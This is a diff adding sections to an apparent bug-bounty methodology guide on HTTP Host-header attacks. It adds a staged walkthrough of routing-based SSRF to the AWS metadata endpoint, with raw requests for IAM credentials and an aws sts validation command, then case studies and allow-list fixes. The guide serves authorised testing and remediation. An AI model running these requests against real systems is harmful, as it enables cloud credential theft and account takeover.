@@ -410,6 +410,66 @@ Host header bugs reach a shell through their chains — pursue these for the top
 ```
 > **The Host→RCE rule:** a Host-header bug is "only" ATO/SSRF until the host you reach (or the account you take over) grants **code execution**. Always ask "**does this internal target or hijacked account let me run a command?**" — internal admin (→ code-exec feature), cloud metadata (→ cloud shell), or an admin ATO (→ admin RCE feature) turns a High Host-header bug into a **Critical RCE chain**. Prove the shell on your own tenant/account, validate creds read-only, and stop (§19).
 
+## 13.2 The full attack, end-to-end — routing-based SSRF via the Host header → cloud metadata, start to finish
+
+> *In plain words:* the Host-header methodology on the wire, using its most Critical and most *distinctly-Host-header* cash-out. The kit's whole spine is **"one header, classify the sink" (§4)** — this walks that: baseline (does the effective host change anything?) → classify (here the *front-end routes by Host*) → confirm reach out-of-band → steer to `169.254.169.254` for cloud IAM creds. Every value is benign; the moment creds land, you **describe and stop** (don't use them).
+
+**Stage 0 — Baseline: can you influence the effective host, and what does it do? (§4).** Send the same request three ways and watch:
+```
+① Host: bank.target.com  (normal)     → 200, the app
+② Host: evil.attacker.com             → 200 same app? / 400 "invalid host"? / different content?  (reflected vs validated vs routed)
+③ Host: localhost   /   Host: 127.0.0.1 → DIFFERENT content (an internal status page, a different vhost)?
+```
+> **Classify (§4.2):** probe ② tells you whether the host is *reflected* (→ reset-poisoning §11 / XSS §10 / cache §12) or *validated*; probe ③'s **different internal content** is the tell for a **routing sink** — the front-end is using your `Host` to pick the **backend**, not just to build links. That routes you to SSRF.
+
+**Stage 1 — Confirm the routing reach out-of-band (does the front-end fetch a host I choose?).**
+```http
+GET / HTTP/1.1
+Host: uniq.oob.pro
+```
+```
+[your interactsh listener]
+  HTTP GET  uniq.oob.pro/   from 198.51.100.10   ← the FRONT-END's IP = it routed to the host I supplied = routing-SSRF
+```
+> A hit **from the front-end's egress** (not your box) proves the proxy dials whatever host you put in the header. *(If plain `Host` is validated, retry via `X-Forwarded-Host:`, a dual `Host`, or an absolute-form request line `GET https://uniq.oob.pro/ HTTP/1.1` — §7.)*
+
+**Stage 2 — Steer it at the cloud metadata endpoint (the sleeper Critical).** The front-end forwards your path to the host you name:
+```http
+GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
+Host: 169.254.169.254
+--------------------------------------------------
+HTTP/1.1 200 OK
+
+bank-app-ec2-role                                   ← the IAM role attached to the instance (AWS IMDS)
+```
+
+**Stage 3 — Read the temporary IAM credentials (read-only proof).**
+```http
+GET /latest/meta-data/iam/security-credentials/bank-app-ec2-role HTTP/1.1
+Host: 169.254.169.254
+--------------------------------------------------
+HTTP/1.1 200 OK
+{ "AccessKeyId":"ASIA...", "SecretAccessKey":"...", "Token":"...", "Expiration":"..." }   ← cloud IAM creds
+```
+> *(If this returns `401`/needs a token, the target is on **IMDSv2** — the routing-SSRF must also carry `X-aws-ec2-metadata-token` via a `PUT /latest/api/token`, which a pure GET-routing sink often can't; note that and pivot to an internal admin service instead, §13.1.)*
+
+**Stage 4 — Describe the impact, then STOP.** Validate the creds are live with a single **read-only** call and **stop there**:
+```bash
+$ AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... aws sts get-caller-identity
+  { "Arn": "arn:aws:sts::1234:assumed-role/bank-app-ec2-role/i-0abc" }   ← proves the creds are real; DO NOT do more
+```
+Report **Critical** — routing-SSRF via the Host header → cloud IAM credentials → cloud account takeover (**CWE-918** SSRF, enabled by **CWE-644** improper Host handling). Do **not** list buckets, read data, or use the role further — `get-caller-identity` is the whole benign proof.
+
+**What each stage proved (the transferable arc):**
+```
+Stage 0  baseline/classify → the front-end routes by Host (internal content on Host:localhost) = a routing sink, not just reflection
+Stage 1  OOB confirm       → the proxy fetched a host I chose, from ITS IP = routing-SSRF (un-false-positive)
+Stage 2  metadata index    → I reached 169.254.169.254 through the header = internal/cloud reach
+Stage 3  IAM creds          → the header became cloud credentials = Critical
+Stage 4  get-caller-identity → creds validated read-only, then STOP — no data touched
+```
+The *same baseline* (Stage 0) routes to the other Host-header cash-outs by **which sink** it reveals: a *reflected* host → **password-reset poisoning → ATO** (§11) or **reflected-host XSS** (§10); a *reflected + cached* host → **web-cache poisoning → mass XSS** (§12); an *OAuth callback built from host* → **code/token theft** (§14). Stage 1's OOB-confirm and Stage 4's safe-stop never change.
+
 ---
 
 # 14. Other Sinks (SSO/OAuth, business logic, host-based authz)
@@ -422,6 +482,29 @@ Host header bugs reach a shell through their chains — pursue these for the top
 □ Email spoofing / notification injection: host controls sender links → phishing.
 ```
 > **If this → then that:** an OAuth flow builds the callback from the host → Host injection can deliver the **auth code/token to your domain** → account takeover. A privileged **vhost** trusted purely on Host → spoof it for **authz bypass**.
+
+---
+
+# Real-world Host-header case studies (learn the pattern, not just the payload)
+
+> Each is a documented landmark. Read them for the **shape** — the server builds a URL, picks a backend, or keys a cache from an attacker-controlled `Host`/`X-Forwarded-Host` — and note how the durable fix is always the same: **validate Host against an allow-list and build sensitive URLs from server config, not the request.**
+
+### Case 1 — Kettle, *"Practical HTTP Host Header Attacks"* (2013): the research that named the class
+- **What:** James Kettle systematised the whole class — **password-reset poisoning** (the reset link built from the request `Host`, mailed to the victim, token captured), **web-cache poisoning**, and **Host-based routing/validation bypasses** — against real frameworks and apps (including Django and Gallery).
+- **Mechanism:** apps trusted the `Host` (or `X-Forwarded-Host`) to build absolute URLs and to route — exactly §11/§12/§13.
+- **Lesson:** this is the reference method; the reset-poisoning → ATO chain (§11) and the routing-SSRF (§13.2) both trace to it. Prove impact in the mailed link / the OOB hit, never "the header is reflected."
+
+### Case 2 — Django `ALLOWED_HOSTS` (CVE-2011-4139, CVE-2012-4520): the framework-level fix
+- **What:** Django ≤1.2.7/1.3.x used the request `Host` to construct full URLs, enabling **cache poisoning** (**CVE-2011-4139**) and **arbitrary-URL generation via crafted `Host` username/password** (**CVE-2012-4520**) — poisoned links in password-reset/invite emails. Django's response was the **`ALLOWED_HOSTS`** setting: `get_host()` now validates the `Host` against an explicit allow-list and rejects the rest.
+- **Mechanism:** trusting `Host` to build email links / URLs (the §11 sink), fixed by allow-listing the host at the framework layer.
+- **Lesson:** the durable remediation you should recommend is exactly this — **an explicit Host allow-list** (`ALLOWED_HOSTS`, never `['*']`) *plus* **absolute URLs from config** for sensitive links (§19). A whole framework added a setting for this class.
+
+### Case 3 — Web cache poisoning via `X-Forwarded-Host` (Kettle, *"Practical Web Cache Poisoning,"* 2018)
+- **What:** many real sites reflected an **unkeyed `X-Forwarded-Host`** into an absolute `<script src>`/`Location`; because the header wasn't part of the cache key, one poisoned response was **served to every subsequent visitor** — mass stored XSS / open redirect from a single request.
+- **Mechanism:** an unkeyed Host-family header reflected into cached HTML (§12/§12.1) — the cache turns a self-XSS into everyone's XSS.
+- **Lesson:** when the host is reflected, the *next* question is "is it cached and is the header keyed?" — a `Vary`/cache-key gap turns a Medium reflection into a Critical mass-impact bug (cross-ref the WebCache kit).
+
+> **The through-line:** the reported impact is **ATO / SSRF-to-cloud / mass-XSS**, the "bug" is trusting an attacker-controlled `Host`/`X-Forwarded-Host`, and the fix is **allow-list the Host + build URLs from config**. Prove the impact end-to-end (§13.2), then recommend that fix (§19).
 
 ---
 
